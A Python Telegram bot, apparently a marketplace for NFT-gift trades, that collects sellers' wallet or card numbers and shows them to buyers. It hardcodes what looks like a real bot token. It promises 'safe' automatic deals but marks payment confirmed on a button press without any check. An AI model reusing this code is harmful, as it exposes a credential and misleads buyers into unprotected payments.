import asyncio
import json
import random
import string
from pathlib import Path

from aiogram import Bot, Dispatcher, F
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message, CallbackQuery

# ----------------- НАСТРОЙКИ -----------------
TOKEN = "8552340509:AAECxiCmtI7tWi3ffWjW7ThFtjzjHTbOEj0"
DATA_FILE = Path("deals.json")
ADMINS = ["rarosls"]
BOT_PUBLIC_USERNAME = "PrimeGiftRobot"

START_PHOTO = "https://www.iphones.ru/wp-content/uploads/2025/05/IMG_8747.jpeg"

# --------------------------------------------
bot = Bot(token=TOKEN)
dp = Dispatcher()
state = {"deals": {}, "temp": {}, "users": {}}


# ----------------- ВСПОМОГАТЕЛЬНЫЕ -----------------
def load_data():
    if DATA_FILE.exists():
        try:
            with DATA_FILE.open("r", encoding="utf-8") as f:
                state_data = json.load(f)
                state["deals"] = state_data.get("deals", {})
        except Exception:
            state["deals"] = {}
    else:
        state["deals"] = {}


def save_data():
    try:
        with DATA_FILE.open("w", encoding="utf-8") as f:
            json.dump({"deals": state["deals"]}, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print("Error saving data:", e)


def gen_id(n=8):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=n))


async def bot_username():
    if BOT_PUBLIC_USERNAME:
        return BOT_PUBLIC_USERNAME
    me = await bot.get_me()
    return me.username


async def send_message(chat_id, text: str, reply_markup=None, parse_mode=ParseMode.HTML):
    try:
        await bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
    except Exception as e:
        print("Error sending message:", e)


# ----------------- /START -----------------
@dp.message(Command("start"))
async def cmd_start(message: Message):
    parts = (message.text or "").split()
    if len(parts) == 2 and parts[1].isalnum() and len(parts[1]) >= 6:
        await open_deal_by_id(message, parts[1])
        return

    text = (
        "🏆 Добро пожаловать в <b>Prime Trade Gifts</b>!\n\n"
        "🔹 Автоматические сделки\n"
        "🔹 Поддержка 24/7\n"
        "🔹 Безопасная купля/продажа NFT-подарков\n\n"
        "Выберите нужный раздел ниже:"
    )
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 Создать сделку", callback_data="create_deal")],
        [InlineKeyboardButton(text="⚙️ Реквизиты", callback_data="manage_requisites")],
        [InlineKeyboardButton(text="📁 Мои сделки", callback_data="my_deals")],
        [InlineKeyboardButton(text="❓ Помощь", callback_data="help")]
    ])
    await bot.send_photo(message.chat.id, START_PHOTO, caption=text, parse_mode=ParseMode.HTML, reply_markup=keyboard)


# ----------------- CALLBACK: Создать сделку -----------------
@dp.callback_query(F.data == "create_deal")
async def cb_create_deal(cq: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🛒 Я покупатель", callback_data="role_buyer")],
        [InlineKeyboardButton(text="💎 Я продавец", callback_data="role_seller")],
        [InlineKeyboardButton(text="⬅️ Вернуться назад", callback_data="back_to_start")]
    ])
    await send_message(cq.message.chat.id, "Выберите вашу роль:", reply_markup=keyboard)
    await cq.answer()


# --- Продавец ---
@dp.callback_query(F.data == "role_seller")
async def role_seller(cq: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 TON", callback_data="currency_ton")],
        [InlineKeyboardButton(text="⭐ Звёзды", callback_data="currency_stars")],
        [InlineKeyboardButton(text="💳 Банковская карта (₽)", callback_data="currency_card")],
        [InlineKeyboardButton(text="⬅️ Вернуться назад", callback_data="back_to_start")]
    ])
    await send_message(cq.message.chat.id, "Выберите валюту сделки:", reply_markup=keyboard)
    await cq.answer()


# --- Валюта TON ---
@dp.callback_query(F.data == "currency_ton")
async def currency_ton(cq: CallbackQuery):
    uid = cq.from_user.id
    state["temp"][uid] = {"role": "seller", "currency": "TON", "stage": "await_wallet"}
    await send_message(cq.message.chat.id, "💎 Введите ваш TON-кошелёк:")
    await cq.answer()


# --- Валюта Звёзды ---
@dp.callback_query(F.data == "currency_stars")
async def currency_stars(cq: CallbackQuery):
    uid = cq.from_user.id
    state["temp"][uid] = {"role": "seller", "currency": "STARS", "stage": "await_amount"}
    await send_message(cq.message.chat.id, "⭐ Введите количество звёзд для сделки (например 100.5):")
    await cq.answer()


# --- Банковская карта (₽) ---
@dp.callback_query(F.data == "currency_card")
async def currency_card(cq: CallbackQuery):
    uid = cq.from_user.id
    state["temp"][uid] = {"role": "seller", "currency": "RUB", "stage": "await_card"}
    await send_message(cq.message.chat.id, "💳 Введите номер вашей банковской карты:")
    await cq.answer()


# --- Покупатель ---
@dp.callback_query(F.data == "role_buyer")
async def role_buyer(cq: CallbackQuery):
    uid = cq.from_user.id
    state["temp"][uid] = {"role": "buyer", "stage": "await_deal_link"}
    await send_message(cq.message.chat.id, "🔗 Отправьте ссылку на сделку от продавца:")
    await cq.answer()


# ----------------- CALLBACK: Назад -----------------
@dp.callback_query(F.data == "back_to_start")
async def cb_back(cq: CallbackQuery):
    await cmd_start(cq.message)
    await cq.answer()


# ----------------- CALLBACK: Помощь -----------------
@dp.callback_query(F.data == "help")
async def cb_help(cq: CallbackQuery):
    text = (
        "ℹ️ <b>Помощь</b>\n\n"
        "💎 Создать сделку — выбери метод оплаты и следуй подсказкам.\n"
        "⚙️ Реквизиты — добавь свой TON или карту.\n"
        "📁 Мои сделки — список твоих активных сделок.\n\n"
        "Поддержка: @PrimeGiftManager"
    )
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⬅️ Вернуться назад", callback_data="back_to_start")]
    ])
    await bot.send_photo(cq.message.chat.id, START_PHOTO, caption=text, parse_mode=ParseMode.HTML, reply_markup=keyboard)
    await cq.answer()

# ----------------- CALLBACK: Мои сделки -----------------
@dp.callback_query(F.data == "my_deals")
async def cb_my_deals(cq: CallbackQuery):
    uid = str(cq.from_user.id)
    user_deals = [d for d in state["deals"].values() if d.get("seller_id") == uid]
    if not user_deals:
        await send_message(cq.message.chat.id, "У вас ещё нет сделок.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⬅️ Вернуться назад", callback_data="back_to_start")]
        ]))
    else:
        for d in user_deals:
            text = (
                f"🆔 Сделка: {d['id']}\n"
                f"💰 Сумма: {d['amount']} {d['currency']}\n"
                f"📄 Описание: {d['description']}\n"
                f"Статус: {d.get('status','active')}\n"
                f"🔗 Ссылка: https://t.me/{await bot_username()}?start={d['id']}"
            )
            await send_message(cq.message.chat.id, text)
    await cq.answer()


# ----------------- CALLBACK: Реквизиты -----------------
@dp.callback_query(F.data == "manage_requisites")
async def cb_requisites(cq: CallbackQuery):
    text = "⚙️ <b>Реквизиты</b>\n\nВыберите способ привязки:"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💳 Привязать карту", callback_data="requisite_card")],
        [InlineKeyboardButton(text="💎 Привязать TON кошелёк", callback_data="requisite_ton")],
        [InlineKeyboardButton(text="⬅️ Вернуться назад", callback_data="back_to_start")]
    ])
    await bot.send_photo(cq.message.chat.id, START_PHOTO, caption=text, parse_mode=ParseMode.HTML, reply_markup=keyboard)
    await cq.answer()


# ----------------- ОБРАБОТКА ТЕКСТОВ -----------------
@dp.message(F.text)
async def handle_text(message: Message):
    uid = message.from_user.id
    txt = message.text.strip()
    temp = state["temp"].get(uid)
    if not temp:
        return

    # TON
    if temp.get("stage") == "await_wallet":
        temp["wallet"] = txt
        temp["stage"] = "await_amount"
        await send_message(message.chat.id, "💰 Введите сумму сделки:")
        return

    # CARD
    if temp.get("stage") == "await_card":
        temp["card"] = txt
        temp["stage"] = "await_amount"
        await send_message(message.chat.id, "💰 Введите сумму сделки в рублях (₽):")
        return

    # AMOUNT
    if temp.get("stage") == "await_amount":
        if not txt.replace('.', '', 1).isdigit():
            await send_message(message.chat.id, "Ошибка: введите число.")
            return
        temp["amount"] = txt
        temp["stage"] = "await_description"
        await send_message(message.chat.id, "✏️ Введите описание товара:")
        return

    # DESCRIPTION
    if temp.get("stage") == "await_description":
        deal_id = gen_id()
        deal = {
            "id": deal_id,
            "seller_id": str(uid),
            "seller_username": message.from_user.username or "",
            "amount": temp["amount"],
            "currency": temp["currency"],
            "description": txt,
            "status": "waiting_payment"
        }
        if temp["currency"] == "TON":
            deal["wallet"] = temp["wallet"]
        if temp["currency"] == "RUB":
            deal["card"] = temp["card"]

        state["deals"][deal_id] = deal
        save_data()
        link = f"https://t.me/{await bot_username()}?start={deal_id}"

        await bot.send_photo(
            message.chat.id,
            START_PHOTO,
            caption=(
                f"✅ Сделка создана!\n\n💰 Сумма: {deal['amount']} {deal['currency']}\n"
                f"📄 Описание: {txt}\n🔗 Ссылка для покупателя: {link}"
            ),
            parse_mode=ParseMode.HTML
        )
        state["temp"].pop(uid, None)
        return

    # Покупатель вводит ссылку
    if temp.get("stage") == "await_deal_link":
        if "?start=" not in txt:
            await send_message(message.chat.id, "❌ Это не ссылка на сделку.")
            return
        deal_id = txt.split("?start=")[-1]
        await open_deal_by_id(message, deal_id)
        state["temp"].pop(uid, None)
        return


# ----------------- ОТКРЫТИЕ СДЕЛКИ -----------------
async def open_deal_by_id(message: Message, deal_id: str):
    deal = state["deals"].get(deal_id)
    if not deal:
        await send_message(message.chat.id, "❌ Сделка не найдена.")
        return

    text = (
        f"💎 <b>Сделка #{deal_id}</b>\n"
        f"Продавец: @{deal['seller_username']}\n"
        f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
        f"📄 Описание: {deal['description']}\n"
    )

    if deal.get("currency") == "TON":
        text += f"💼 Кошелёк продавца: <code>{deal['wallet']}</code>\n\n"
    if deal.get("currency") == "RUB":
        text += f"💳 Карта продавца: <code>{deal['card']}</code>\n\n"

    text += "После оплаты нажмите кнопку ниже 👇"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Я отправил оплату", callback_data=f"confirm_payment|{deal_id}")],
        [InlineKeyboardButton(text="⬅️ Вернуться назад", callback_data="back_to_start")]
    ])
    await bot.send_photo(message.chat.id, photo=START_PHOTO, caption=text, reply_markup=keyboard, parse_mode=ParseMode.HTML)


# ----------------- ПОДТВЕРЖДЕНИЯ -----------------
@dp.callback_query(F.data.regexp(r"^confirm_payment\|[A-Z0-9]{6,}$"))
async def confirm_payment(cq: CallbackQuery):
    _, deal_id = cq.data.split("|", 1)
    deal = state["deals"].get(deal_id)
    if not deal:
        await cq.answer("Сделка не найдена.", show_alert=True)
        return

    deal["status"] = "paid"
    save_data()
    await send_message(cq.message.chat.id, "💳 Оплата подтверждена! Ожидайте передачу NFT.")
    seller_id = int(deal["seller_id"])
    try:
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🎁 Я передал подарок", callback_data=f"gift_sent|{deal_id}")]
        ])
        await send_message(seller_id, f"✅ Покупатель оплатил сделку {deal_id}! Подтвердите передачу NFT:", reply_markup=kb)
    except Exception:
        pass
    await cq.answer()


@dp.callback_query(F.data.regexp(r"^gift_sent\|[A-Z0-9]{6,}$"))
async def gift_sent(cq: CallbackQuery):
    _, deal_id = cq.data.split("|", 1)
    deal = state["deals"].get(deal_id)
    if not deal:
        await cq.answer("Сделка не найдена.", show_alert=True)
        return

    deal["status"] = "completed"
    save_data()
    await send_message(cq.message.chat.id, "🎁 Сделка завершена! Покупатель уведомлён.")
    await cq.answer()


# ----------------- ЗАПУСК -----------------
async def on_startup():
    load_data()
    print("Loaded deals:", len(state["deals"]))


async def main():
    await on_startup()
    try:
        await dp.start_polling(bot)
    finally:
        await bot.session.close()


if __name__ == "__main__":
    asyncio.run(main())
